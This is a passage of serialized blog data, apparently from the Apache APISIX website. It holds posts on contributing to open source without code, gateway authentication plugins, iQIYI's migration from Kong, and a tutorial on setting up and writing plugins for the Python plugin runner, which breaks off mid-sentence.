instructions, if there is an architectural design, the principle of the introduction is even better.\\n\\nWe can submit documentation for open source projects of interest, or even fix the documentation, for example\\n\\n- code updates, the documentation is not updated at the same time\\n- fix the wrong download links, documentation links\\n- Optimize the documentation, modify the description of the documentation to make it easier to understand\\n- Submit architecture design, schematic documentation\\n\\n### Build local community, organize/participate in events\\n\\nIf you are interested in a project, get involved in the local community, communicate with like-minded people, organize local events, and contribute to the development of the project.\\n\\nIf there is no local community, you can build one as an initiator. I know that the Apache Software Foundation encourages people to build Local Communities, such as ALC Beijing, and other technical communities such as KubeSphere and Cloud Native Community are actively developing local communities.\\n\\n### Actively participate in community discussions\\n\\n#### is active on the Apache mailing list\\n\\nThe Apache culture encourages discussion and decision making through mailing lists, where everything is documented. Each Apache project has its own mailing list, and if you have an idea for a project, the community strongly encourages you to discuss it on the mailing list.\\n\\nWe can.\\n\\n- Post a poll for a project\\n- Reply to discussions started by others to express our own views\\n- Start a discussion\\n\\nWhy a mailing list?\\n\\nMailing lists give me a very old-fashioned feeling. I went to learn about the history of the Apache Software Foundation, and initially the founders of the foundation discussed issues by way of mailing lists, is it a preservation of the old culture?\\n\\nAlthough the Internet is developing rapidly, but the world still has difficulties in receiving pictures, difficulties in using other software, although wechat, Twitter users we know also do not cover the world, but the use of mail can be the smallest threshold to establish contact with others, to ensure that people around the world can participate in community discussions, this is the original intention of the Apache Software Foundation to retain the mailing list approach.\\n\\n#### is active on Github\\n\\nGithub is the most common site for developers, and most open source projects are hosted on Github. I can\\n\\n- raise an issue with my thoughts on how to improve the project\\n- submit a bug report\\n- review pr submitted by other partners\\n\\nThese are all ways to contribute to open source projects.\\n\\n#### Apache mail list vs Github\\n\\nWhy use a mailing list when you have Github? The code is hosted on Github, and it seems like all the community collaboration is done on Github?\\n\\nIf there are no objections to discussing an issue on the mailing list, the proposal will be approved by default. If there are objections, they will be fully discussed and eventually agreed or set aside.\\n\\nThe use of mailing lists for discussion is also a way to identify with the Apache culture. For projects that follow Apache rules, the mailing list is the primary place for the community, and Github is a convenient collaborative tool.\\n\\n## Contributing with Coding\\n\\n### Contribute features, fix bugs\\n\\nOf course, open source projects are inseparable from the code. If you are familiar with the technology stack of an open source project, you will soon be able to contribute code, work with community partners to improve the relevant features, fix bugs, and continue to contribute, becoming a project contributor, and further nominated to become a committer, PMC is very easy to do. Most of the contributors become committer by submitting code, but as a small partner like me who is not familiar with code, this one is not suitable.\\n\\nIt is important to note that a committer is an affirmation of a contributor\'s past contributions and will not be removed as a committer because he or she will no longer contribute in the future, nor will they have greater rights because they are a committer.\\n\\n## Summary\\n\\nIf you are interested in open source projects but not familiar with the code, and want to participate in the open source community, writing articles, making videos, sharing with the public, building local communities, and actively participating in community discussions are all very good ways, welcome to practice."},{"id":"Centralized Authentication with Apache APISIX and Advanced Tricks","metadata":{"permalink":"/blog/2021/09/07/how-to-use-apisix-auth","source":"@site/blog/2021/09/07/how-to-use-apisix-auth.md","title":"Centralized Authentication with Apache APISIX and Advanced Tricks","description":"This article introduces the authentication function of the cloud native API gateway Apache APISIX, and introduces the importance and usage in detail.","date":"2021-09-07T00:00:00.000Z","formattedDate":"September 7, 2021","tags":[{"label":"Authentication","permalink":"/blog/tags/authentication"},{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":7.94,"truncated":true,"authors":[{"name":"Xinxin Zhu","url":"https://github.com/starsz","imageURL":"https://avatars.githubusercontent.com/u/25628854?v=4"}],"prevItem":{"title":"How can I contribute to an open source project without writing code?","permalink":"/blog/2021/09/09/how-to-contribute-to-an-openSource-without-coding"},"nextItem":{"title":"iQIYI API Gateway Update and Practice with Apache APISIX","permalink":"/blog/2021/09/07/iqiyi-usercase"}},"content":"> This article describes the authentication features of Apache APISIX, in terms of importance and usage.\\n\\n\x3c!--truncate--\x3e\\n\\nAuthentication is a very common feature in daily life, and we all come across it in our daily lives. For example, face recognition when using Alipay, fingerprint/face clocking in and out of work, and password login on websites are all scenarios of authentication.\\n\\n![Authentication Concepts](https://static.apiseven.com/202108/1631004418593-0a46f949-72aa-4cd4-8f38-1988327c92d6.png)\\n\\nAs shown above, Jack requests a server-side application with an account password, and the server-side application needs a module dedicated to authentication to handle this part of the logic. After the request is processed, if the JWT Token authentication method is used, the server will provide a Token to identify the user as Jack. If the account password is entered incorrectly during the login process, it will lead to authentication failure. This scenario must be very familiar to everyone, so we won\'t expand the example here.\\n\\n## What is the significance of network authentication\\n\\n### Security\\n\\nAuthentication ensures the security of back-end services and avoids unauthorized access, thus ensuring the security of data. For example, it prevents certain hacking attacks, and some malicious calls, which can be blocked by authentication.\\n\\n### Practicality\\n\\nFrom the perspective of practicality, it can be more convenient to record the operator or caller. For example, clocking in at work is actually a way to record \\"who performed this operation\\" to count employees\' work information.\\n\\nSecondly, it can record the access frequency and frequency of access. For example, it can record the frequency and frequency of requests initiated by a user in the last few minutes, which can determine how active the user is, and also whether it is a malicious attack, etc.\\n\\n### Functionality\\n\\nAt the functional level, it can handle operations with different privileges for different identities by identifying them. For example, in a company, you cannot use certain pages or services with your identity authority. To be more detailed, it can do some related technical restriction policies for different identities or different API interface callers, such as limiting the flow and speed, etc., so as to achieve different functional restrictions according to different users (callers).\\n\\n## Benefits of centralized authentication with Apache APISIX\\n\\n### From traditional to new model\\n\\nAs shown in the figure below, the diagram on the left shows us a more common traditional authentication approach. Each application service module goes to develop a separate authentication module that is used to support a set of process handling for authentication. But when the volume of services increases, it becomes clear that the development workload of these modules is huge and repetitive.\\n\\n![Apache APISIX Authentication](https://static.apiseven.com/202108/1631004492221-0721d933-705d-4875-b956-e94a11a45135.png)\\n\\nAt such times, we can achieve unification and reduce the amount of development by placing this part of the development logic in the Apache APISIX gateway.\\n\\nAs shown in the figure on the right, the user or application party goes directly to request Apache APISIX, and then Apache APISIX passes the authenticated identity information to the upstream application service after it has been identified and authenticated. After that, the upstream application service can read this information from the request header and then process the subsequent related work.\\n\\nAfter the general process, let\'s list it in detail.\\n\\n### Benefit 1: Configuration convergence, unified management\\n\\n![Dashboard](https://static.apiseven.com/202108/1631004574541-87b607eb-2971-4c1d-a1d6-74cf4a5fdd42.png)\\n\\nThe screenshot above is a screenshot of the APISIX-Dashboard interface, you can see the routing, Consumer and other data information. The Consumer here can be understood as an application party, for example, you can create a Consumer specifically for the application and configure related authentication plugins, such as JWT, Basic-Auth, etc. When there is a new service, we need to create another Consumer, and then configure this part of the configuration information to the second application service.\\n\\nThrough centralized authentication, we can converge and unify the customer configuration and achieve the effect of reducing the operation and maintenance cost.\\n\\n### Benefit 2: Rich plug-ins, reduced development\\n\\nApache APISIX, as an API gateway, is now open to cooperation with various plug-in functions for adaptation, and the plug-in library is relatively rich. At present, it can already work with a large number of authentication-related plug-ins, as shown in the following figure.\\n\\n![API Gateway Authentication Plugin](https://static.apiseven.com/202108/1631004738218-586e84af-a5ab-4714-845d-4d71b7ba79e3.png)\\n\\nBasic authentication plug-ins such as Key-Auth, Basic-Auth, they are authenticated by way of account password.\\n\\nMore complex authentication plugins such as Hmac-Auth, JWT-Auth. e.g. Hmac-Auth generates a signature by doing some encryption on the request information. When the API caller carries this signature to the Apache APISIX gateway Apache APISIX calculates the signature with the same algorithm and passes it only if the signer and the application caller are authenticated the same.\\n\\nThe Authz-casbin plugin is a project currently being developed by Apche APISIX in collaboration with the Casbin community. The principle of the application is to handle role-based authority control (RBAC) and ACL-related operations according to Casbin rules.\\n\\nOthers are generic authentication protocols and collaborative authentication protocols with third-party components, such as OpenID-Connect authentication mechanism, and LDAP authentication.\\n\\n### Benefit 3: Flexible and powerful configuration\\n\\nHow to understand powerful is that Apache APISIX can do different levels of plug-in configuration for each Consumer (i.e., caller application).\\n\\n![Configuration flexibility](https://static.apiseven.com/202108/1631004783828-3dd0056c-a6aa-4ab9-b902-7bd2ca545ffe.png)\\n\\nAs shown above, we have created two consumers Consumer A and Consumer B. If we apply Consumer A to `Application 1`, subsequent accesses to `Application 1` will enable this part of Consumer A\'s plugins, such as IP blacklisting, limiting the number of concurrency, etc. If we apply Consumer B to `Application 2`, the access log of `Application 2` will be sent to the logging system for collection via HTTP since the http-log plugin is enabled.\\n\\n## How to play with authentication in Apache APISIX\\n\\nRegarding the play of Apache APISIX authentication, here is a recommendation of three stages of play for your reference only, or you can use and apply them in more depth on the basis of these.\\n\\n### Primary: General play\\n\\nOrdinary play is recommended based on Key-Auth, Basic-Auth, JWT-Auth and Hmac-Auth, the use of these plug-ins need to be associated with the use of Consumer.\\n\\n#### Step 1: Create a route and configure the authentication plugin\\n\\nCreate a route, configure the upstream as `httpbin.org` and enable the `basic-auth` plugin.\\n\\n![Create route](https://static.apiseven.com/202108/1631004892467-71c93f8f-dc0e-47fe-a88f-943adb9edbff.png)\\n\\n#### Step 2: Create consumer and configure identity information\\n\\nCreate the consumer foo. In the consumer, we need to configure the user authentication information, e.g. `username` for foo and `password` for `bar`.\\n\\n![Create consumer](https://static.apiseven.com/202108/1631004937828-15ac5d8f-0e45-4c3d-94e8-2b180266b379.png)\\n\\n#### Step 3: Application service carries authentication information for access\\n\\nThe application accesses Apache APISIX with `username:foo`,`password: bar`. Apache APISIX is authenticated and carries the request Authorization request header upstream to `httpbin.org`. Since the get interface in `httpbin.org` returns the request information, we can observe the request header `Authorization` in it.\\n\\n![Request Carry](https://static.apiseven.com/202108/1631004973305-4b209f79-f7de-41a2-994e-8877a6624d99.png)\\n\\n### Intermediate usages of authentication\\n\\nThe intermediate mode is to use Apache APISIX with the OpenID-Connect plugin to interface to third-party authentication services. openID-Connect is an authentication mechanism that can be used to interface to a user\'s user management system or user management services, such as Authing and Tencent Cloud in China, Okta and Auth0, etc.\\n\\n![Third-party authentication mode](https://static.apiseven.com/202108/1631005002268-7393b40e-1733-4e66-bc09-742be221efae.png)\\n\\nThe details are as follows, using Okta cloud service as an example.\\n\\n#### Step 1: Create an OpenID-Connect application\\n\\nCreate an application that supports OpenID-Connect from the Okta console page.\\n\\n![Create](https://static.apiseven.com/202108/1631005022640-1e931b14-8175-47f3-bfb8-46e09cec616b.png)\\n\\n#### Step 2: Create a route and configure the OpenID-Connect plug-in\\n\\nCreate a route, configure the upstream address to httpbin.org, and enable the openid-connect plug-in, and fill in the configuration of the Okta application into the openid-connect plug-in.\\n\\n![Configure the plugin](https://static.apiseven.com/202108/1631005045489-b637ef9a-c71c-440f-ae58-a93398a4c9dd.png)\\n\\n#### Step 3: When the user visits, it will jump to the login page. After the login is complete, the upstream application gets the user information\\n\\nAt this point, when the user accesses Apache APISIX, they will first be redirected to the Okta login page. At this point, you need to fill in the account password of the user that already exists in Okta. After login is completed, Apache APISIX will carry the Access-Token and ID-Token to the upstream, and encode the authenticated user information in base64 in the Userinfo request header and pass it to the upstream.\\n\\n![APISIX Page](https://static.apiseven.com/202108/1631005077846-0f877a03-ddcd-46f6-a38d-f046b4700058.png)\\n\\n## Advanced: upload your own code snippets through the Serverless plug-in\\n\\nThe DIY gameplay provided here makes use of the Serverless plugin, which is feature-rich and has a lot of ways to play. If you have your own use of play, you are also welcome to communicate in the community.\\n\\nThe specific operation process is to upload their own code snippets through the Serverless plug-in to Apache APISIX, the process of Serverless plug-in support dynamic configuration and hot updates.\\n\\n### Method 1: Custom judgment logic\\n\\n![Judgment Logic](https://static.apiseven.com/202108/1631005112469-c04868b8-388e-4b81-abcc-d37b6a8951f5.png)\\n\\nSome judgments are made by request headers, parameters and other related information. By this approach, we can go to implement some of our own rules, such as combining some internal authentication of the enterprise, or go to write some of our own business logic.\\n\\n### Method 2: Initiate authentication request\\n\\n![Authentication Request](https://static.apiseven.com/202108/1631005141578-f90cf948-4913-45cd-a28e-9e697ad197fe.png)\\n\\nBy initiating an HTTP request through the HTTP library, we can use a third-party service to do some authentication and authentication related things and then parse the returned results. In this way, we can do a lot of things that can be extended. For example, interfacing to Redis or a database, as long as it\'s over TCP or UDP, can be attempted with the Serverless plugin.\\n\\n### Upload Configurations\\n\\nAfter completing the custom code snippet, we create the route and configure the snippet to the Serverless plugin. Later, we will test if the plugin is working by accessing Apache APISIX and getting the appropriate feedback.\\n\\n![Configure Upload](https://static.apiseven.com/202108/1631005184917-bc620c0b-d4c6-43f5-8450-4f5b2b9549e1.png)"},{"id":"2021/09/07/iqiyi-usercase","metadata":{"permalink":"/blog/2021/09/07/iqiyi-usercase","source":"@site/blog/2021/09/07/iQIYI-usercase.md","title":"iQIYI API Gateway Update and Practice with Apache APISIX","description":"This article introduces why iQIYI abandoned Kong and chose the cloud native API gateway Apache APISIX as the company gateway and application scenarios.","date":"2021-09-07T00:00:00.000Z","formattedDate":"September 7, 2021","tags":[{"label":"Case Studies","permalink":"/blog/tags/case-studies"}],"readingTime":7.995,"truncated":true,"authors":[{"name":"Cong He"}],"prevItem":{"title":"Centralized Authentication with Apache APISIX and Advanced Tricks","permalink":"/blog/2021/09/07/how-to-use-apisix-auth"},"nextItem":{"title":"Python helps you develop Apache APISIX plugin","permalink":"/blog/2021/09/06/python-helps-you-quickly-with-apache-apisix-development"}},"content":"> In this article, you can understand how iQIYI\'s technical team updates and integrates the company structure based on Apache APISIX gateway to create a brand-new gateway service.\\n\\n\x3c!--truncate--\x3e\\n\\n## Background\\n\\niQIYI has developed a gateway-skywalker, it is based on the secondary development of Kong, the current traffic is also relatively large, the daily peak of the gateway stock business million QPS, the number of API routes tens of thousands. But the product\u2019s shortcomings began to show up in the wake of its use.\\n\\n1. Performance is not satisfactory, because the volume of business, every day received a lot of CPU IDLE too low alert\\n2. The components of the system architecture depend on many\\n3. The development cost of operation and maintenance is high\\n\\nAfter taking over the project this year, we started to do some research on gateway products in the light of the problems and dilemmas mentioned above, and then we found Apache APISIX.\\n\\n## Apache APISIX Advantage\\n\\nBefore choosing Apache APISIX, the iqiyi platform was already using Kong, but it was later abandoned.\\n\\n### Why Give Up Kong\\n\\n![Kong\'s disadvantage](https://static.apiseven.com/202108/1646804680988-c0c833ee-79b1-4c9d-88ed-c158e9c374cd.png)\\n\\nKong uses PostgreSQL to store its information, which is obviously not a good way. We also looked at the performance of Apache APISIX compared to Kong in the course of our research, and it\u2019s amazing that Apache Apisix is 10 times better than Kong in terms of performance optimization. We also compared some of the major gateway products, Apache APISIX\u2019s response latency is more than 50% lower than other gateways, and Apache APISIX can still run stably when the CPU reaches more than 70% .\\n\\nWe also found out that Apache APISIX, like Kong, is based on the OpenResty technology, so the cost of technology migration is relatively low. And Apache APISIX is very adaptable and can be easily deployed in a variety of environments, including cloud computing platforms.\\n\\nWe also saw that Apache APISIX was very active throughout the open source project, handled the issues very quickly, and the cloud native architecture of the project was in line with our follow up plans, so we chose Apache APISIX.\\n\\n## Architecture Based on Apache APISIX\\n\\nThe overall architecture of iQIYI Gateway is shown below, including domain name, gateway to service instance and monitoring alarm. DPVS is an open source project within the company based on LVS, Hubble monitoring alerts is also a deep secondary development based on an open source project, and the Consul area has been optimized for performance and high availability.\\n\\n![iQIYI Gateway architecture](https://static.apiseven.com/202108/1646792292257-8907ca46-0a08-4659-8549-810bc5fa788a.png)\\n\\n### Scenario 1: Microservice Gateway\\n\\nAbout the gateway this piece, simple from the control surface and the data surface introduce.\\n\\n![Gateway details](https://static.apiseven.com/202108/1646791464287-ba803227-7bd0-4134-8709-3bea19ba9432.png)\\n\\nThe data plane is mainly oriented to the front-end users, and the whole architecture from LB to Gateway is multi-location and multi-link disaster deployment.\\n\\nFrom the perspective of control surface, because of the multi-cluster composition, there will be a micro-service platform to do cluster management and service management. Microservice platforms allow users to experience services as one-stop-shops that expose them to immediate use without having to submit a work order. The back end of the control panel will have Gateway Controller, which controls the creation of all apis, plug-ins, and related configurations, and Service Controller, which controls Service registration and health checks.\\n\\n### Scenario 2: Basic Functions\\n\\nAt present, the API architecture based on Apache APISIX has realized some basic functions, such as current limiting, authentication, alarm, monitoring and so on.\\n\\n![Micro service platform function](https://static.apiseven.com/202108/1646733199348-15d96c96-a64f-42b1-b7da-cd3c61fd7de9.png)\\n\\nFirst is the HTTPS section, iQIYI for security reasons, certificates and keys are not stored on the gateway machine, will be placed on a dedicated remote server. We didn\u2019t support this when we used Kong, we used the prefix Nginx to do HTTPS Offload, and after the migration to Apache APISIX, we implemented this feature on Apache APISIX, which is a layer less forwarding over the link.\\n\\nIn the current limiting function, in addition to the basic current limiting, but also added a precise current limiting and user-specific granularity of the current limiting. Authentication function, in addition to the basic API Key authentication, for specialized services also provide the relevant Passport authentication. For black product filtering, access to the company\u2019s WAF Security Cloud.\\n\\nThe monitoring feature is currently implemented using the Apache APISIX plug-in Prometheus, and the metrics data will interface directly with the company\u2019s monitoring system. Logging and call chain analysis is also supported through Apache APISIX.\\n\\n### Scenario 3: Serviece Discovery\\n\\nWith regard to the above-mentioned service discovery, it is mainly through the service center to register the service to the Consul cluster, and then through the DNS service discovery to do dynamic updates, qae is a micro-service platform in our company. A simple example illustrates the general flow of updating a backend application instance.\\n\\n![Service discovery process](https://static.apiseven.com/202108/1646733434679-ecb6431e-64c8-4e55-b01f-9cb117e2e523.png)\\n\\nWhen the instance changes, the corresponding node is first unlogged from Consul and a request to update the DNS cache is sent to the gateway through the API Gateway Controller. After the cache update is successful, the Controller then feeds back to the QAE platform to stop the associated back-end application node and avoid reforwarding traffic to the offline node.\\n\\n### Scenario 4: Directional Route\\n\\n![Directional route](https://static.apiseven.com/202108/1646733411551-50fd722b-b4af-4674-a297-08350d1252d2.png)\\n\\nThe gateway is multi-location deployment, build a set of multi-location backup link in advance, at the same time suggest the user back-end service is also multi-location deployment nearby. Then the user creates an API service on the Skywalker Gateway platform, the Controller deploys the API routing on the entire DC gateway cluster, and the business domain defaults to CNAME on the unified gateway domain name.\\n\\nIt provides multi-local access, disaster preparedness and handoff capability for business directly, and also supports user-defined resolution routing. For the user\u2019s own fault-cut flow, blue-green deployment, canary release  needs, users can use the uuid domain name to customize the resolution of routing configuration, but also to support the back-end service discovery custom scheduling.\\n\\n### Scenario 5: Multi-site Multi-level Disaster Tolerance\\n\\nAs we mentioned earlier, at the business level we have business proximity and disaster preparedness requirements for large volumes of traffic, large clusters, and a wide audience of clients.\\n\\nFor disaster preparedness, in addition to multi-link backup, but also consider multi-level multi-node problem, fault node closer to the client, the greater the impact of business and traffic.\\n\\n1. If it is the farthest back-end service node failure, depending on the health check mechanism of the gateway and the service center, it can realize the fuse of the fault single node or the switch of the fault DC, and the influence scope is limited to the specified service, the user is not aware.\\n2. If it is a gateway level fault, we need to rely on the health check mechanism of L4 DPVS, fusing the fault gateway node, the influence range is small, the user is not aware.\\n3. If the fault points can not be repaired by the above-mentioned fusing measures, it is necessary to rely on the multi-point availability dialing of the domain name granularity to realize the automatic fault switching at the domain name resolution level, which is a relatively slow way to repair the fault, affect the business much, the user can feel.\\n\\n## Problems Encountered during Migration\\n\\nDuring our migration practice from Kong to Apache APISIX, we addressed and optimized some known architectural issues, but also encountered some new ones.\\n\\n### Result 1: SNI Compatibility Issues Not Supported in The Front End Were Resolved\\n\\nMost of the frontend is now supported for SNI, but you\u2019ll also encounter a few frontend that won\u2019t pass the hostname during SSL. At present, we have done a compatibility for this situation, using port matching method to obtain the relevant certificates.\\n\\n### Result 2: A Large Number of API Routing Matching Problems Have Been Optimized\\n\\nAs I said before, we currently have more than 9,000 API services running directly online, and may increase in the future. In order to solve this problem, we made some performance optimization, according to the API to decide whether to match the domain name or the path first.\\n\\n### Result 3: The Limitation of ETCD Interface Is Solved\\n\\nAfter accessing Apache APISIX, the ETCD interface limitation has also been resolved and the 4M limit has now been lifted.\\n\\n### Result 4: Performance Issues Optimized for The Number of ETCD Connections\\n\\nCurrently, every worker at Apache APISIX is connected to the ETCD, and every listening directory is going to make a connection. For example, a physical machine is 80core, with 10 listening directories and 800 connections on a single gateway server. With a gateway cluster of 10,8,000 connections is a lot of pressure on the ETCD. The optimization is to take one worker and listen to a limited set of necessary directories and share the information with the rest of the workers.\\n\\n### To Be Optimized\\n\\nIn addition to the above problems, there are also a number of issues are being optimized.\\n\\n1. A number of API issues, even if APISIX is supported, we need to consider other component-dependent bottlenecks. Such as the ETCD, Prometheus Monitoring and logging services described above. So in the future, we may adopt the two ways of large cluster sharing and small cluster independence to mix the deployment of business, for example, some important business we will deploy in small clusters.\\n2. With respect to the Prometheus monitoring metric, we will continue to scale down and optimize the DNS service to find more.\\n\\n## Expectations for Apache APISIX\\n\\nWe hope that in future development updates Apache APISIX will not only support more functionality, but also maintain performance efficiency and stability over time."},{"id":"2021/09/06/python-helps-you-quickly-with-apache-apisix-development","metadata":{"permalink":"/blog/2021/09/06/python-helps-you-quickly-with-apache-apisix-development","source":"@site/blog/2021/09/06/python-helps-you-quickly-with-Apache-APISIX-development.md","title":"Python helps you develop Apache APISIX plugin","description":"This article will introduce you how to use Python to develop custom plugins and environment deployment on the cloud-native API gateway Apache APISIX.","date":"2021-09-06T00:00:00.000Z","formattedDate":"September 6, 2021","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":6.375,"truncated":true,"authors":[{"name":"Jinchao Shuai","url":"https://github.com/shuaijinchao","imageURL":"https://avatars.githubusercontent.com/u/8529452?v=4"}],"prevItem":{"title":"iQIYI API Gateway Update and Practice with Apache APISIX","permalink":"/blog/2021/09/07/iqiyi-usercase"},"nextItem":{"title":"Apache APISIX \xd7 KubeSphere: Providing a better gateway and K8S Ingress Controller","permalink":"/blog/2021/08/31/apache-apisix-kubeSphere-a-better-gateway-and-k8s-ingress-controller"}},"content":"> The [Java Plugin](https://github.com/apache/apisix-java-plugin-runner) and [Go Plugin](https://github.com/apache/apisix-java-plugin-runner) languages have been supported in the community before the Apache APISIX Python Runner, and today Python Runner is now available, giving the community another option for developing plugins for Apache APISIX.\\n\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\n### Apache APISIX\\n\\n`Apache APISIX` is a high-performance cloud-native open-source API gateway that provides unified request interception and governance (e.g., authentication, caching, versioning, fusing, auditing, etc.) to help developers easily provide secure and reliable services to the outside world, while developers only need to focus on business implementation with `Apache APISIX`, which saves a lot of time in developing and maintaining generic capabilities and reduces the complexity of the overall business architecture.\\n\\n### Python\\n\\nPython is an interpreted high-level programming language with a simple syntax, good code readability, cross-platform, portability, and development efficiency.\\nAs a high-level programming language, it has a high degree of abstraction and shields a lot of underlying details (e.g., `GC`).\\n) allows us to focus more on the development of application logic in the development process. As a 30-year old development language, Python has a well-developed ecology and various modules, and most of our development and application scenarios can be found in mature modules or solutions from the community. `Python`\\nWe won\'t go into all the other advantages. The disadvantages of `Python` are also obvious: `Python`, as an interpreted language, has a relatively large performance gap compared to compiled languages like `C++` and `Go`.\\n\\n### Apache APISIX Python Runner\\n\\n[apache-apisix-python-runner](https://github.com/apache/apisix-python-plugin-runner) This project can be interpreted as `Apache APISIX`\\nand `Python`.\\nThe most important thing is to let more `Python developers` who are interested in `Apache APISIX` and `API gateways` to learn more about the use of `Apache APISIX` and `API gateways` through this project.\\nThe following is a diagram of the architecture of `Apache APISIX` multi-language support.\\n\\n![Apache APISIX work flow](https://static.apiseven.com/202108/1639468460315-bb51d913-be72-4329-a47b-7e987dff21ba.png)\\n\\nThe above diagram shows the workflow of `Apache APISIX` on the left, and the `Plugin Runner` on the right is the plug-in runner for each language, the `apisix-python-plugin-runner` introduced in this article is the one that supports `Python`.\\nlanguage.\\n\\nWhen you configure a `Plugin Runner` in `Apache APISIX`, `Apache APISIX` will start a child process to run the `Plugin Runner` that belongs to the same user as the `Apache APISIX` process belongs to the same user, and when we restart or reload `Apache APISIX`, `Plugin Runner` will also be restarted.\\n\\nIf you configure the `ext-plugin-*` plugin for a given route, a request to hit that route will trigger an `Apache APISIX` `RPC` call to the `Plugin Runner` via the `Unix Socket`. The call is split into two phases.\\n\\n- [ext-plugin-pre-req](https://github.com/apache/apisix/blob/master/docs/en/latest/plugins/ext-plugin-pre-req.md): Before executing the `Apache APISIX` built-in plugin (Lua language plugin).\\n- [ext-plugin-post-req](https://github.com/apache/apisix/blob/master/docs/en/latest/plugins/ext-plugin-post-req.md): after executing the `Apache APISIX` plug-in (Lua language plug-in).\\n\\nYou can choose and configure the execution timing of `Plugin Runner` as needed.\\n\\nThe `Plugin Runner` handles the `RPC` call, creates a simulated request inside it, and then runs the multilingual plugin and returns the result to Apache APISIX.\\n\\nThe execution order of multilingual plugins is defined in the `ext-plugin-*` plugin configuration entry, and like other plugins, they can be enabled and redefined on the fly.\\n\\n## Deploy test\\n\\n### Base runtime environment\\n\\n- Apache APISIX 2.7\\n- Python 3.6+\\n\\nTo deploy Apache APISIX, please refer to the [Apache APISIX official documentation: How to build Apache APISIX](https://github.com/apache/apisix/blob/master/docs/en/latest/how-to-build.md) for details.\\n\\n### Download and install Python Runner\\n\\n```bash\\n$ git clone https://github.com/apache/apisix-python-plugin-runner.git\\n$ cd apisix-python-plugin-runner\\n$ make install\\n```\\n\\n### Configuring Python Runner\\n\\n#### development mode\\n\\n##### Run Python Runner\\n\\n```bash\\n$ cd /path/to/apisix-python-plugin-runner\\n$ APISIX_LISTEN_ADDRESS=unix:/tmp/runner.sock python3 apisix/main.py start\\n```\\n\\n##### Modify APISIX configuration file\\n\\n```bash\\n$ vim /path/to/apisix/conf/config.yaml\\napisix:\\n  admin_key:\\n    - name: \\"admin\\"\\n      key: edd1c9f034335f136f87ad84b625c8f1\\n      role: admin\\next-plugin:\\n  path_for_test: /tmp/runner.sock\\n```\\n\\n#### Production mode\\n\\n##### Modify APISIX configuration file\\n\\n```bash\\n$ vim /path/to/apisix/conf/config.yaml\\napisix:\\n  admin_key:\\n    - name: \\"admin\\"\\n      key: edd1c9f034335f136f87ad84b625c8f1\\n      role: admin\\next-plugin:\\n  cmd: [ \\"python3\\", \\"/path/to/apisix-python-plugin-runner/apisix/main.py\\", \\"start\\" ]\\n```\\n\\n#### Python Runner configuration (optional)\\n\\nIf you need to adjust the ``Log Level`` or ``Unix Domain Socket`` environment variables, you can modify the `Runner` configuration file\\n\\n```bash\\n$ vim /path/to/apisix-python-plugin-runner/apisix/config.yaml\\nsocket:\\n  file: $env.APISIX_LISTEN_ADDRESS # Environment variable or absolute path\\n\\nlogging:\\n  level: debug # error warn info debug\\ndebug\\n```\\n\\n### Start Python Runner\\n\\n```bash\\n$ cd /path/to/apisix\\n# Start or Restart\\n$ ./bin/apisix [ start | restart ]\\n```\\n\\nStart or restart `APISIX`, when `APISIX` and `Python Runner` have been configured and started.\\n\\n### Testing Python Runner\\n\\n#### Configuring Apache APISIX Routing and Plugin Information\\n\\n```bash\\n# Test with the default demo plugin\\n$ curl http://127.0.0.1:9080/apisix/admin/routes/1 -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n  \\"uri\\": \\"/get\\",\\n  \\"plugins\\": {\\n    \\"ext-plugin-pre-req\\": {\\n      \\"conf\\": [\\n        { \\"name\\": \\"stop\\", \\"value\\":\\"{\\\\\\"body\\\\\\":\\\\\\"hello\\\\\\"}\\"}\\n      ]\\n    }\\n  },\\n  \\"upstream\\": {\\n        \\"type\\": \\"roundrobin\\",\\n        \\"nodes\\": {\\n            \\"127.0.0.1:1980\\": 1\\n        }\\n    }\\n}\'\\n```\\n\\n- `plugins.ext-plugin-pre-req.conf` is the `Runner` plugin configuration, `conf` is an array format to set multiple plugins at the same time.\\n- The `name` in the plugin configuration object is the name of the plugin, which should be the same as the plugin code file and object name.\\n- `value` in the plugin configuration object is the plugin configuration, which can be a `JSON` string.\\n\\n#### access verification\\n\\n```bash\\n$ curl http://127.0.0.1:9080/get -i\\nHTTP/1.1 200 OK\\nDate: Fri, 13 Aug 2021 13:39:18 GMT\\nContent-Type: text/plain; charset=utf-8\\nTransfer-Encoding: chunked\\nConnection: keep-alive\\nhost: 127.0.0.1:9080\\naccept: */*\\nuser-agent: curl/7.64.1\\nX-Resp-A6-Runner: Python\\nServer: APISIX/2.7\\n\\nHello, Python Runner of APISIX\\n```\\n\\n## Plugin Development\\n\\n### Plugin directory\\n\\n```bash\\n/path/to/apisix-python-plugin-runner/apisix/plugins\\n```\\n\\nThe `.py` files in this directory will be loaded automatically.\\n\\n### Plugin example\\n\\n```bash\\n/path/to/apisix-python-plugin-runner/apisix/plugins/stop.py\\n/path/to/apisix-python-plugin-runner/apisix/plugins/rewrite.py\\n```\\n\\n### Plugin format\\n\\n```python\\nfrom apisix.runner.plugin.base import Base\\nfrom apisix.runner.http.request import Request\\nfrom apisix.runner.http.response import Response\\n\\n\\nclass Stop(Base):\\n    def __init__(self):\\n        \\"\\"\\"\\n        Example of `stop` type plugin, features:\\n            This type of plugin can customize response `body`, `header`, `http_code`\\n            This type of plugin will interrupt the request\\n        \\"\\"\\"\\n        super(Stop, self). __init__(self.__class__. __name__)\\n\\n    def filter(self, request: Request, response: Response):\\n        \\"\\"\\"\\n        The plugin executes the main function\\n        :param request:\\n            request parameters and information\\n        :param response:\\n            response parameters and information\\n        :return:\\n        \\"\\"\\"\\n        # In the plugin you can get the configuration information through `self.config`,\\n        # if the plugin configuration is JSON it will be automatically converted to\\n        # a dictionary structure\\n        # print(self.config)\\n\\n        # set the response headers\\n        headers = request.headers\\n        headers[\\"X-Resp-A6-Runner\\"] = \\"Python\\"\\n        response.headers = headers\\n\\n        # Set the response body information\\n        response.body = \\"Hello, Python Runner of APISIX\\"\\n\\n        # Set the response status code\\n        response.status_code = 201\\n\\n        # Interrupt the request process by calling `self.stop()`, which will immediately respond to the client\\n        # If `self.stop()` is not shown or if `self.rewrite()` is shown, the request will continue\\n        # Default is `self.rewrite()`\\n        self.stop()\\n```\\n\\n### Plugin specifications and considerations\\n\\n- Plugin object implementation must inherit from the `Base` class\\n- The plugin must implement the `filter` function\\n- `filter` function parameters can only contain `Request` and `Response` class objects as 